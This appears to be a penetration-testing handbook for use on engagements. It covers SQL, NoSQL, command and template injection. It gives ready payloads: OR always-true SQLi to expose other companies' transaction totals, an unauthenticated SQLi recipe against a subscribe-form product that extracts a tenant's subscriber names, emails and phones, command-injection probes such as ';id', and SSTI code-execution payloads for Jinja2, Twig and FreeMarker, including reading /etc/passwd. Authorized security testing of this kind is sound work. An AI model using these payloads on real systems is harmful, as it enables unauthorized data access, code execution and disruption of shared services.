> On-site completion baseline per `../rules/engagement-guide.md` §4.2.1: every filter param on endpoints where row count / content visibly changes gets tested; "please login" responses are N/A as a block. Pick probes by stack (JSON/Mongo operators, ES search boxes, Java HQL/SpEL, SSTI when a template engine exists; the SQL surface still goes quotes / boolean / time-delay). After a 405, moving positions means more than changing encoding.
> Quick-hits "List filter OR + total" and "Email subscribe iframe same-dir list" — search by heading. WooYun statistics / sqlmap --os-shell / reverse shells / English appendices were cut; vary on-site by stack, don't rely on courseware.

# Injection Testing Handbook (SQLi / Command Injection / SSTI)

## SQL Injection

### List filter OR + total (ES / search lists)

Enterprise transaction, consumption, and employee rosters filter on `employeeName` / name / keyword, responses carry `total` / `totalNum` / `totalSize`, and the backend is usually ES or "a search that can run a snippet of SQL".

**This shot is dangerous.** `or (1)=(1)` on a transaction/ES surface means "drop tenant and date, match the whole database". Totals in the hundreds of millions are the norm; a single query can saturate the cluster, drag down the list, and spray other companies' transactions onto your screen. Prove it with a **total-number differential + the first row visibly not yours**, then stop.

1. First submit a nonexistent string — expect empty or a few rows.  
2. Then boolean false: `')and (1)=(2)--` should still be empty (proves you can change logic, not yet open the whole DB).  
3. Only last, always-true: `1')or (1)=(1)--+A` (if `1=1` is blocked, switch to `(1)=(1)`). **Fire exactly once.** Look at total only; keep pageSize at 1–5.  
4. Empty/single digits → hundreds of thousands, millions, hundreds of millions, and the first row is another **employee's / another company's** transaction — that's when it counts. Proof ends here.  
5. **Constraint on this shot only (OR always-true against ES/transaction whole-DB):** no repeated fires / replays of the same payload, no maxed pageSize, no next-page / export, no sqlmap `--dump` / `--risk=3` on this shot, no delete/update endpoints. Taking the cluster down is not proof.  
6. Fuzzy search treating `or` as a keyword, or the growth is all your own company's legitimately readable rows → false positive, don't report. ES only eating Query DSL and treating this SQL as a plain string → switch to DSL / `$where`, don't grind.

This is the opener, not the only permitted shot, and **not** a ban on all injection data extraction. UNION / time-delay / error-based / WAF encoding / other injection entry points: vary on-site by stack; prefer time-delay over OR always-true when it's safer.

### Email subscribe iframe same-dir list (quick-hits has a pointer)

Recognize: email subscribe embedded in an iframe; the same-dir list's `key` is used as auth and spliced into SQL. Common shells: subscribe form skins / `alertform.../main/index.php?id=tenant`.

Fire (unauthenticated):

1. Copy the tenant id from the iframe  
2. Hit same-dir `GET /main/list.php?key=`  
3. `key` is spliced into SQL as auth. `1' OR client_id=<tenant> LIMIT 1#` (this one shot only)

Counts as: response contains that tenant's subscriber names/emails/phones. Wrong Key / empty array is the baseline.

False positives: no list.php; `key` goes constant-comparison or prepared statements. Missing on one site doesn't delete the quick-hits row. Don't all-net rescan the same skin across customers.

### Quick detection

Single quote / boolean false-true / time-delay. After a 405, move to query / json / header / path. This OR+total shot does **not** use sqlmap `--dump` / `--os-shell`.

### JSON / Mongo operators (by stack, not spraying quotes on every path)

`{"$ne":""}` / `{"$gt":""}` / `password[$ne]=x`. Login forms aren't business params. Only counts with other-subject data or a stable differential.

## Command Injection

Common entry points: filename / ip / ping / conversion / diagnostics pages. Probes `;id` / `|id` / `$(id)` / time-delay `sleep 5`. Disprove-or-prove is enough; no local reverse shell as courseware.

## SSTI (Server-Side Template Injection)

### Detection Payloads

```
{{7*7}}          → if 49 returns, SSTI exists
${7*7}           → Java/FreeMarker
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby
*{7*7}           → Thymeleaf (Spring)
```

### Common framework exploitation

```python
# Jinja2 (Python/Flask)
{{config}}                           # information disclosure
{{''.__class__.__mro__[2].__subclasses__()}}  # get classes
# RCE:
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

---